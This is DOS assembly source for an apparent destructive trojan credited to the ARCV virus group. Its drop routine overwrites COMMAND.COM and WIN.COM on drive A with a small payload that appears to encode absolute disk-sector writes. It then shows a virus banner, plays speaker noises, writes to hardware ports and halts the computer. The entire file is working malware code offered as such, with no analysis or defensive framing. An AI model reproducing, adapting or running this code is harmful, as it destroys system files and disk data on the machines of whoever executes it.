.model tiny
.code

                org  100h                                       ;Where we start

over:           jmp  infect                     ;Go straight to the
                                                ;drop routine and do it
activate        proc    far

start:          mov     ah,0h                   ;Set the Video Mode
                mov     al,12h                  ;640x480 16 colors
                int     10h                     ;do it!

                jmp     loc_1
data_1          db      4
data_2          dw      0
        db   62h, 79h
copyright       db      '  -=ðIOð=-  '
                db      '(C) -= ARCV =-   '
data_5          db      '            Join.... Virus ...Anon.'
                db      ' .*.*.*. '
                db      'The       Proto ú T     Virus'
                db      '         '
                db      '       $'
loc_1:
                push    si                      ;<G> Even from the command line
                push    di                      ;we're funny!
                mov     si,80h                  ;stick it in, just in case
        cld             ; Clear direction
        call    sub_1
        cmp byte ptr [si],0Dh
        je  loc_4           ; Jump if equal
                mov     cx,28h
        lea di,data_5       ; ('Attention: Please press ') Load ef
locloop_2:
        lodsb               ; String [si] to al
        cmp al,0Dh
        je  loc_3           ; Jump if equal
        stosb               ; Store al to es:[di]
        loop    locloop_2       ; Loop if cx > 0
loc_3:
        inc cx
        mov al,2Eh          ; '.'
        rep stosb           ; Rep when cx >0 Store al to es:[di]
loc_4:
                pop     di
                pop     si

                mov     dx,si
                mov     cx,di
                mov     data_2,cx
loc_5:
        mov data_1,0FFh
loc_6:
        add data_1,1
        mov bl,data_1
                mov     cx,80
        call    sub_2

locloop_7:
        mov al,byte ptr copyright+20h[bx]   ; ('.')
                mov     ah,0eh
                int     10h                     ; Video display   ah=functn 0Eh
                        ;  write char al, teletype mode
        inc bx
        call    sub_3
        mov dl,0FFh
        mov ah,6
        int 21h         ; DOS Services  ah=function 06h
                        ;  special char i/o, dl=subfunc
        jnz loc_10          ; Jump if not zero
        loop    locloop_7       ; Loop if cx > 0

        cmp byte ptr copyright+20h[bx],24h  ; ('.') '$'
        je  loc_5           ; Jump if equal
        jmp short loc_6

activate        endp


sub_1       proc    near
loc_8:
        inc si
        cmp byte ptr [si],20h   ; ' '
        je  loc_8           ; Jump if equal
                retn
sub_1       endp

sub_2       proc    near
                NOP
                NOP
                push    ax
                push    bx
                push    cx
                push    dx
                NOP
                NOP
                mov     dx,si
                mov     cx,di
                inc     bh
                mov     ah,0Bh
        int 10h         ; Video display   ah=functn 0Bh
                mov     ah,10h
                mov     al,0
                mov     bl,1
                mov     bh,10
                int     10h                     ; Video display   ah=functn 0Eh
                NOP
                NOP
                pop        dx
                pop        cx
                pop        bx
                pop        ax
                NOP
                NOP
                retn
sub_2       endp

sub_3       proc    near
        push    cx
                mov     cx,100h
locloop_9:
        loop    locloop_9       ; Loop if cx > 0
        pop cx
        retn
sub_3       endp

loc_10:
        call    sub_2
        mov cx,4Fh
locloop_11:
        mov al,20h          ; ' '
                mov     ah,0Eh
        int 10h         ; Video display   ah=functn 0Eh
                        ;  write char al, teletype mode
        loop    locloop_11      ; Loop if cx > 0

                mov     ah,13
        mov cx,data_2
        int 10h         ; Video display   ah=functn 01h
                call    bang_bang               ; Let's make some noise now!
                int     20h
infect:   NOP
          NOP
          mov  dx,offset file1_name             ; ready the file to do  #1
          xor  cx,cx                            ; zero registers
          mov  ax,3c02h                         ; create file w/ read-write
          int  21h                              ; do it!

          xchg ax,bx
          mov  ah,40h                           ; 40 hex write to file
          mov  cx,38                            ; we're 38 bytes long
          mov  dx,offset data1_file             ; and these are the 38 bytes
          int  21h                              ; do it

          mov  ah,3eh                           ; close the file
          int  21h                              ; do it

          mov  dx,offset file2_name             ; ready the file to do  #2
          xor  cx,cx                            ; zero registers
          mov  ax,3c02h                         ; create file w/ read-write
          int  21h                              ; do it!

          xchg ax,bx
          mov  ah,40h                           ; 40 hex write to file
          mov  cx,38                            ; we're 38 bytes long
          mov  dx,offset data2_file             ; and these are the 38 bytes
          int  21h                              ; do it

          mov  ah,3eh                           ; close the file
          int  21h                              ; do it

          mov  dx,offset file3_name             ; ready the file to do  #2
          xor  cx,cx                            ; zero registers
          mov  ax,3c02h                         ; create file w/ read-write
          int  21h                              ; do it!

          xchg ax,bx
          mov  ah,40h                           ; 40 hex write to file
          mov  cx,38                            ; we're 38 bytes long
          mov  dx,offset data3_file             ; and these are the 38 bytes
          int  21h                              ; do it

          mov  ah,3eh                           ; close the file
          int  21h                              ; do it

          jmp activate                         ; now let's run the pretty stuff

data1_file        db      '°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&úô',0 ; Better look
file1_name        db      'A:\command.com',0                         ; at this under
data2_file        db      '°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&úô',0 ; the DeBugger
file2_name        db      'A:\dos\command.com',0                     ; to see what it
data3_file        db      '°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&°¹ÿ3ÒÍ&úô',0 ; does!!!
file3_name        db      'A:\windows\win.com',0
;*************************************************************************
;
; The following segment comes from a VCL routine. Credit Due and Given!
;
;*************************************************************************
bang_bang       proc    near
                mov     cx,0025h                ; First argument is 5
new_shot:       push    cx          ; Save the current count
        mov     dx,0140h        ; DX holds pitch
        mov     bx,0100h        ; BX holds shot duration
        in      al,061h         ; Read the speaker port
        and     al,11111100b        ; Turn off the speaker bit
fire_shot:  xor al,2                    ; Toggle the speaker bit
        out 061h,al         ; Write AL to speaker port
        add     dx,09248h       ;
        mov cl,3                    ;
        ror dx,cl           ; Figure out the delay time
        mov cx,dx                   ;
        and cx,01FFh                ;
        or  cx,10                   ;
shoot_pause:    loop    shoot_pause             ; Delay a bit
        dec bx          ; Are we done with the shot?
        jnz fire_shot       ; If not, pulse the speaker
        and     al,11111100b        ; Turn off the speaker bit
        out     061h,al         ; Write AL to speaker port
        mov     bx,0002h                ; BX holds delay time (ticks)
        xor     ah,ah           ; Get time function
        int     1Ah         ; BIOS timer interrupt
        add     bx,dx                   ; Add current time to delay
shoot_delay:    int     1Ah         ; Get the time again
        cmp     dx,bx           ; Are we done yet?
        jne     shoot_delay     ; If not, keep checking
        pop cx          ; Restore the count
        loop    new_shot        ; Do another shot

                xor     ah,ah                   ; BIOS get time function
                int     1Ah
                xchg    dx,ax                   ; AX holds low word of timer
                mov     dx,0FFh                 ; Start with port 255
out_loop:       out     dx,al                   ; OUT a value to the port
                dec     dx                      ; Do the next port
                jne     out_loop                ; Repeat until DX = 0
                cli                             ; Clear the interrupt flag
                hlt                             ; HaLT the computer
                jmp     short $                 ; Just to make sure
endp            bang_bang

end       over                                   ; <SIGH> We're Done!
